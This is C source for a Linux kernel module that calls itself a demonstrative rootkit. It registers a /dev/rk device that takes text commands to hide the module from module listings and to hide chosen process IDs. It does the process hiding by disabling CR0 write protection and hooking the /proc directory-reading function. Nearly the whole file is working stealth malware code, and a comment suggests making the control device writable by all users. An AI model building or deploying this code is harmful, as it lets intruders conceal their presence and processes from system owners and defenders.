#include <linux/init.h>   
#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>    
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>
#include <linux/proc_fs.h>

#define DEVICE_NAME "rk"
#define CLASS_NAME "rk"

#define MAX_NUM_PIDS 1024

// Commands
#define HIDE_MOD_CMD "modhide"
#define SHOW_MOD_CMD "modshow"
#define HIDE_PID_CMD "phide"
#define SHOW_PID_CMD "pshow"

static int major_number;
static struct class *char_class;
static struct device *char_device;

static unsigned int pids[MAX_NUM_PIDS];
static unsigned int pid_count = 0;

static int module_hidden = 0;

static struct proc_dir_entry *proc_root;
static struct list_head *prev_mod;
static struct list_head *prev_kobj;


// Char driver prototypes
static int     device_open(struct inode *, struct file *);
static int     device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);

// Other prototypes
void hide_module(void);
void show_module(void);
void hide_proc(const char *);
void show_proc(const char *);

int (*orig_readdir) (struct file *, void *, filldir_t);

static struct file_operations *proc_fops;
filldir_t orig_filldir;

static struct file_operations dev_fops =
{
   .owner = THIS_MODULE,
   .open = device_open,
   .read = device_read,
   .write = device_write,
   .release = device_release,
};

static int device_open(struct inode *inodep, struct file *filep)
{
    return 0;
}

// Writes data to userland
static ssize_t device_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
{
    return len;
}

// Receives data from userland
static ssize_t device_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
{
    char *cmds = (char *)kzalloc(len + 1, GFP_KERNEL);
    
    if (cmds) {
        char *tok = cmds, *end = cmds;
        copy_from_user(cmds, buffer, len);
        
        // Get command
        strsep(&end, " ");
        
        if (strncmp(tok, HIDE_MOD_CMD, strlen(HIDE_MOD_CMD)) == 0) {
            hide_module();
        }
        else if (strncmp(tok, SHOW_MOD_CMD, strlen(SHOW_MOD_CMD)) == 0) {
            show_module();
        }
        else if(strncmp(tok, HIDE_PID_CMD, strlen(HIDE_PID_CMD)) == 0) {
            tok = end;
            strsep(&end, " ");
            hide_proc(tok);
        }
        else if(strncmp(tok, SHOW_PID_CMD, strlen(SHOW_PID_CMD)) == 0) {
            tok = end;
            strsep(&end, " ");
            show_proc(tok);
        }      
    }
    kfree(cmds);
    return len;
}

static int device_release(struct inode *inodep, struct file *filep)
{
    return 0;
}

int in_array(int val, int *arr, int size)
{
    int i;
    for (i = 0; i < size; i++) {
        if (arr[i] == val) {
            return 1;
        }
    }
    return 0;
}

int rk_filldir(void *buffer, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
    long name_as_int;
    strict_strtol(name, 10, &name_as_int);
    if (in_array(name_as_int, pids, pid_count))
        return 0;
        
    return orig_filldir(buffer, name, namlen, offset, ino, d_type);
}

static int proc_readdir(struct file *filep, void *buffer, filldir_t fdir)
{
    orig_filldir = fdir;
    return orig_readdir(filep, buffer, rk_filldir);
}

/*
 * Set device permissions
 * TODO: This is not working. For now run chmod 666 /dev/rk
 */
static int uevent(struct device *dev, struct kobj_uevent_env *env)
{
    add_uevent_var(env, "DEVMODE=%#o", 0666);
    return 0;
}

void hide_module(void)
{
    if (module_hidden)
        return;
    
    // Store addr of module for use when unhiding
    prev_mod = THIS_MODULE->list.prev;
    prev_kobj = THIS_MODULE->mkobj.kobj.entry.prev;
    
    // Hide from /proc/modules & /sys/module
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    
    THIS_MODULE->sect_attrs = NULL;
    THIS_MODULE->notes_attrs = NULL;
    
    module_hidden = !module_hidden;
    printk(KERN_INFO "rk: Module hidden.");

}

void show_module(void)
{
    if (!module_hidden)
        return;
        
    list_add(&THIS_MODULE->list, prev_mod);
    module_hidden = !module_hidden;
    printk(KERN_INFO "rk: Module revealed.");
}

void hide_proc(const char *pid)
{
    long pid_as_int;
    strict_strtol(pid, 10, &pid_as_int);
    pids[pid_count] = pid_as_int;
    pid_count++;
    printk(KERN_INFO "rk: Hiding pid %s.\n", pid);
}

void show_proc(const char *pid)
{
    // TODO: implement
    printk(KERN_INFO "rk: Revealing pid %s.\n", pid);    
}

int device_init(void)
{
    // Dynamically allocate major device number
    if ((major_number = register_chrdev(0, DEVICE_NAME, &dev_fops)) < 0) {
        printk(KERN_ERR "rk: Failed to register a major number.\n");
        return major_number;
    }
    printk(KERN_INFO "rk: Device major number is %d.\n", major_number);
    
    // Register device class
    char_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(char_class)) {
        unregister_chrdev(major_number, DEVICE_NAME);
        printk(KERN_ERR "rk: Failed to register device class.\n");
        return PTR_ERR(char_class);
    }
    char_class->dev_uevent = uevent;
    printk(KERN_INFO "rk: Device class registered.\n");
    
    // Register device driver
    char_device = device_create(char_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
    if (IS_ERR(char_device)) {
        class_destroy(char_class);
        unregister_chrdev(major_number, DEVICE_NAME);
        printk(KERN_ERR "rk: Failed to register device driver.\n");
        return PTR_ERR(char_device);
    }
    printk(KERN_INFO "rk: Device driver registered.\n");
        
    printk(KERN_INFO "rk: Module initialized.\n");
    return 0;
}

// Initializes pointer to proc_root and hijacks proc readdir syscall
void proc_init(void)
{
    struct proc_dir_entry *new_proc;
    static struct file_operations fileops_struct = {0};
    new_proc = proc_create("tmp", 0644, NULL, &fileops_struct);
    proc_root = new_proc->parent;
    remove_proc_entry("tmp", 0);
    
    proc_fops = (struct file_operations*) proc_root->proc_fops;
    orig_readdir = proc_fops->readdir;
    
    write_cr0(read_cr0() & (~0x10000));
    proc_fops->readdir = proc_readdir;
    write_cr0(read_cr0() | 0x10000);
}

static int __init init_mod(void)
{    
    int dev_init_ret = 0;
    if ((dev_init_ret = device_init()) > 0) {
        return dev_init_ret;
    }
    proc_init();
    // hide_module();
	return 0;
}

static void __exit exit_mod(void)
{
    device_destroy(char_class, MKDEV(major_number, 0));
    class_unregister(char_class);
    class_destroy(char_class);
    unregister_chrdev(major_number, DEVICE_NAME);
    printk(KERN_INFO "rk: Module removed.\n");
}

module_init(init_mod);
module_exit(exit_mod);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tyler Riedal <riedalsolutions@gmail.com>");
MODULE_DESCRIPTION("Sample rootkit implementation for demonstrative purposes.");
